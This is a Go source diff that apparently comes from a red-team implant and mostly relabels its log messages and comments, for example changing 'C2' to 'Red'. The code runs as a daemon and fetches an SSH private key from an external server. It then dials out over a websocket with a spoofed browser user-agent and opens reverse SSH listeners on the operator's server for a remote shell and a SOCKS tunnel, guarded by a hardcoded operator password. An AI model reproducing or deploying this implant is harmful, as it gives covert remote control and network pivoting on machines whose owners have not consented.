@@ -10,7 +10,6 @@ import (
 	"fmt"
 	"io/ioutil"
 	"log"
-	"net"
 	"net/http"
 	"net/http/cookiejar"
 	"net/url"
@@ -30,7 +29,7 @@ import (
 func main() {
 
 	if len(os.Args) != 2 {
-		fmt.Printf("Can also do: %s [start|stop] but OK... \n ", os.Args[0])
+		fmt.Printf("FYI: Use %s [start|stop] but OK... \n ", os.Args[0])
 	}
 
 	if LogFile != "" {
@@ -50,13 +49,13 @@ func main() {
 
 			// check if daemon already running.
 			if _, err := os.Stat(PIDFile); err == nil {
-				log.Println("Already running or pid file exist.")
+				log.Println("Implant: Already running or pid file exist.")
 				os.Exit(1)
 			}
 
 			cmd := exec.Command(os.Args[0], "run")
 			cmd.Start()
-			log.Printf("Daemon process %s, PID %d\n", os.Args[0], cmd.Process.Pid)
+			log.Printf("Implant: Daemon process %s, PID %d\n", os.Args[0], cmd.Process.Pid)
 
 			savePID(cmd.Process.Pid)
 			time.Sleep(1)
@@ -73,11 +72,11 @@ func main() {
 			go func() {
 				signalType := <-ch
 				signal.Stop(ch)
-				log.Println("Exit command received. Exiting...")
+				log.Println("Implant: Exit command received. Exiting...")
 
 				// this is a good place to flush everything to disk
 				// before terminating.
-				log.Println("Received signal type : ", signalType)
+				log.Println("Implant Received signal type : ", signalType)
 
 				// remove PID file
 				os.Remove(PIDFile)
@@ -97,43 +96,43 @@ func main() {
 			if _, err := os.Stat(PIDFile); err == nil {
 				data, err := ioutil.ReadFile(PIDFile)
 				if err != nil {
-					log.Println("Daemon Not running")
+					log.Println("Implant: Daemon Not running")
 					os.Exit(1)
 				}
 				ProcessID, err := strconv.Atoi(string(data))
 
 				if err != nil {
-					log.Println("Unable to read and parse process id found in ", PIDFile)
+					log.Println("Implant: Unable to read and parse process id found in ", PIDFile)
 					os.Exit(1)
 				}
 
 				process, err := os.FindProcess(ProcessID)
 
 				if err != nil {
-					log.Printf("Unable to find process ID [%v] with error %v \n", ProcessID, err)
+					log.Printf("Implant: Unable to find process ID [%v] with error %v \n", ProcessID, err)
 					os.Exit(1)
 				}
 				// remove PID file
 				os.Remove(PIDFile)
 
-				log.Printf("Killing process ID [%v] now.\n", ProcessID)
+				log.Printf("Implant: Killing process ID [%v] now.\n", ProcessID)
 				// kill process and exit immediately
 				err = process.Kill()
 
 				if err != nil {
-					log.Printf("Unable to kill process ID [%v] with error %v \n", ProcessID, err)
+					log.Printf("Implant: Unable to kill process ID [%v] with error %v \n", ProcessID, err)
 					os.Exit(1)
 				} else {
-					log.Printf("Killed process ID [%v]\n", ProcessID)
+					log.Printf("Implant: Killed process ID [%v]\n", ProcessID)
 					os.Exit(0)
 				}
 
 			} else {
-				log.Println("Daemon Not running.")
+				log.Println("Implant: Daemon Not running.")
 				os.Exit(1)
 			}
 		} else {
-			log.Printf("Unknown command : %v\n", os.Args[1])
+			log.Printf("Implant: Unknown command : %v\n", os.Args[1])
 			log.Printf("Usage : %s [start|stop]\n", os.Args[0])
 			os.Exit(1)
 		}
@@ -142,26 +141,26 @@ func main() {
 	}
 }
 
+// getSSHKeyHTTP fetches SSH private key from external server
 func getSSHKeyHTTP() ([]byte, error) {
 
-	// Fetch SSH private key from external server
 	// TODO: Implement backoff: https://github.com/jpillora/backoff
 	resp, err := http.Get(SSHServerUserKeyUrl)
 	if err != nil {
-		log.Println("Key Server not accessible or file not found")
+		log.Println("Implant: Key Server not accessible or file not found")
 		return nil, err
 	}
 	defer resp.Body.Close()
 
 	eKeyBytesA, err := ioutil.ReadAll(resp.Body)
 	if err != nil {
-		log.Println("Key Server response not understood")
+		log.Println("Implant: Key Server response not understood")
 		return nil, err // TODO: Should not exit, instead try to remediate within backoff or return error
 	}
 
 	eKeyBytes, err := b64ToBytes(string(eKeyBytesA[:]))
 	if err != nil {
-		log.Println("Base64 decode error:", err)
+		log.Println("Implant: Base64 key decode error:", err)
 		return nil, err
 	}
 	return eKeyBytes, nil
@@ -171,19 +170,21 @@ func b64ToBytes(b64 string) ([]byte, error) {
 	// Local unwrap
 	eKeyBytes, err := base64.StdEncoding.DecodeString(b64)
 	if err != nil {
-		log.Println("Base64 decode error:", err)
+		log.Println("Implant: Base64 key decode error:", err)
 		return nil, err
 	}
 	return eKeyBytes, nil
 }
-func doit() {
 
-	runtime.GOMAXPROCS(runtime.NumCPU())
+func doit() {
 
 	var (
 		eKeyBytes []byte
 		err       error
+		httpProxyURL *url.URL
 	)
+
+	runtime.GOMAXPROCS(runtime.NumCPU())
 
 	if SSHServerUserKey != "" {
 		eKeyBytes, err = b64ToBytes(SSHServerUserKey)
@@ -191,7 +192,7 @@ func doit() {
 		// Remote fetch
 		eKeyBytes, err = getSSHKeyHTTP()
 		if err != nil {
-			log.Println("Unable to proceed as SSH key not fetched")
+			log.Println("Implant: Unable to proceed as SSH key not fetched")
 		}
 	}
 	// Decryption involves a shared transmission key (not the SSH privatekey passphrase)
@@ -203,8 +204,7 @@ func doit() {
 
 	signer, err := ssh.ParsePrivateKey(key)
 	if err != nil {
-		// TODO: attempt to remedy with backoff
-		log.Fatalf("Unable to parse private key: %v", err)
+		log.Fatalf("Implant: Unable to parse private key: %v", err)
 	}
 
 	// Setup authentication with the private key
@@ -236,7 +236,6 @@ func doit() {
 	// TODO: config variable
 	d.EnableCompression = true
 
-	var httpProxyURL *url.URL
 
 	// TODO: Introduce proxy options:
 	// build the websocket dialer with proxy information like credentials
@@ -255,17 +254,18 @@ func doit() {
 				return nil, err
 			}
 
-			if  HTTPProxyAuthUser != ""  && HTTPProxyAuthPass != ""{
+			if HTTPProxyAuthUser != "" && HTTPProxyAuthPass != "" {
 				httpProxyURL.User = url.UserPassword(HTTPProxyAuthUser, HTTPProxyAuthPass)
 			}
 			return httpProxyURL, nil
 		}
+		log.Println("HTTP:WS: Explicit proxy set")
 	}
 
 	// b. Get proxy from environment
 	if HTTPProxyFromEnvironment == strings.ToLower("yes") {
-		log.Println("Environment proxy set")
-		d.Proxy= http.ProxyFromEnvironment
+		d.Proxy = http.ProxyFromEnvironment
+		log.Println("HTTP:WS: Environment proxy set")
 	}
 
 	/* HTTP endpoint */
@@ -297,17 +297,18 @@ func doit() {
 	wssReq.Form = data
 
 	// Setup headers
-	wssReq.Header.Set("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X x.y; rv:42.0) Gecko/20100101 Firefox/42.0")
+	wssReq.Header.Set("User-Agent",
+		"Mozilla/5.0 (Macintosh; Intel Mac OS X 1.5; rv:42.0) Gecko/20170101 Firefox/42.0")
 
 	// TODO: test auth: https://github.com/gorilla/websocket/blob/master/client_server_test.go
 	wsConn, resp, err := d.Dial(wssReqURL, wssReq.Header)
 
 	// TODO: Backoff?
 	if err != nil {
-		log.Printf("WS-Dial INTO remote server error: %s", err)
+		log.Printf("HTTP:WS: WS-Dial INTO remote server error: %s", err)
 		if err == websocket.ErrBadHandshake {
-			log.Printf("Response Status: %s", resp.Status)
-			log.Fatalln(fmt.Printf("handshake failed with status %d\n", resp.StatusCode))
+			log.Printf("HTTP:WS: Response Status: %s", resp.Status)
+			log.Fatalln(fmt.Printf("HTTP:WS: handshake failed with status %d\n", resp.StatusCode))
 		}
 	}
 
@@ -323,23 +324,23 @@ func doit() {
 	serverConn, err = ssh.Dial("tcp", serverEndpoint.String(), sshConfig)
 	*/
 
-	// Server (C2) side:
+	// Server (Red) side:
 	// Listen on remote server port - SSH Shell, command, Subsystems
 	listener, err := serverConn.Listen("tcp", SSHRemoteEndpoint.String())
 	if err != nil {
-		log.Fatalln(fmt.Printf("Listen open port ON remote server error: %s", err))
+		log.Fatalln(fmt.Printf("SSH: Listen open port ON SSHRemoteEndpoint error: %s", err))
 	}
 	defer listener.Close()
 
-	// Server (C2) side:
+	// Server (Red) side:
 	// Listen on remote server port - SOCKS
 	listenerS, err := serverConn.Listen("tcp", SSHRemoteEndpointSOCKS.String())
 	if err != nil {
-		log.Fatalln(fmt.Printf("Listen open port ON remote server error: %s", err))
+		log.Fatalln(fmt.Printf("SSH: Listen open port ON SSHRemoteEndpointSOCKS error: %s", err))
 	}
-	defer listener.Close()
+	defer listenerS.Close()
 
-	// Server (C2) side:
+	// Server (Red) side:
 	// Setup reverse SSH client authentication
 	config := &ssh.ServerConfig{
 		// Provide an additional level of protection for remote SSH shell
@@ -348,7 +349,7 @@ func doit() {
 			if c.User() == SSHRemoteCmdUser && string(pass) == SSHRemoteCmdPwd {
 				return nil, nil
 			}
-			return nil, fmt.Errorf("password rejected for %q", c.User())
+			return nil, fmt.Errorf("SSH: RTO password (SSHRemoteCmdPwd) rejected for %q", c.User())
 		},
 		// TODO: Implement Key-based auth for the operators
 		// See: https://go.googlesource.com/crypto/+/master/ssh/client_auth_test.go
@@ -361,87 +362,24 @@ func doit() {
 	go acceptSLoop(listenerS)
 	// accept SSH shell
 	acceptLoop(listener, config)
-
 }
 
-// In order to comply websocket to net.Conn interface it needs to implement Read/Write
-// TODO: Refactor
-func NewWebSocketConn(websocketConn *websocket.Conn) net.Conn {
-	c := wsConn{
-		Conn: websocketConn,
-	}
-	return &c
-}
 
-//Read is not threadsafe though thats okay since there
-//should never be more than one reader
-func (c *wsConn) Read(dst []byte) (int, error) {
-	ldst := len(dst)
-	//use buffer or read new message
-	var src []byte
-	if l := len(c.buff); l > 0 {
-		src = c.buff
-		c.buff = nil
-	} else {
-		t, msg, err := c.Conn.ReadMessage()
-		if err != nil {
-			return 0, err
-		} else if t != websocket.BinaryMessage {
-			log.Printf("<WARNING> non-binary msg")
-		}
-		src = msg
-	}
-	//copy src->dest
-	var n int
-	if len(src) > ldst {
-		//copy as much as possible of src into dst
-		n = copy(dst, src[:ldst])
-		//copy remainder into buffer
-		r := src[ldst:]
-		lr := len(r)
-		c.buff = make([]byte, lr)
-		copy(c.buff, r)
-	} else {
-		//copy all of src into dst
-		n = copy(dst, src)
-	}
-	//return bytes copied
-	return n, nil
-}
 
-func (c *wsConn) Write(b []byte) (int, error) {
-	if err := c.Conn.WriteMessage(websocket.BinaryMessage, b); err != nil {
-		return 0, err
-	}
-	n := len(b)
-	return n, nil
-}
-
-func (c *wsConn) SetDeadline(t time.Time) error {
-	if err := c.Conn.SetReadDeadline(t); err != nil {
-		return err
-	}
-	return c.Conn.SetWriteDeadline(t)
-}
-
-// Daemon: Save PID
+// savePID saves daemon PID to file
 func savePID(pid int) {
 
 	file, err := os.Create(PIDFile)
 	if err != nil {
-		log.Printf("Unable to create pid file : %v\n", err)
-		os.Exit(1)
+		log.Printf("Implant: Daemon Unable to create pid file : %v\n", err)
 	}
 
 	defer file.Close()
 
 	_, err = file.WriteString(strconv.Itoa(pid))
-
 	if err != nil {
-		log.Printf("Unable to create pid file : %v\n", err)
-		os.Exit(1)
+		log.Printf("Implant: Daemon Unable to create pid file : %v\n", err)
 	}
 
 	file.Sync() // flush to disk
-
 }
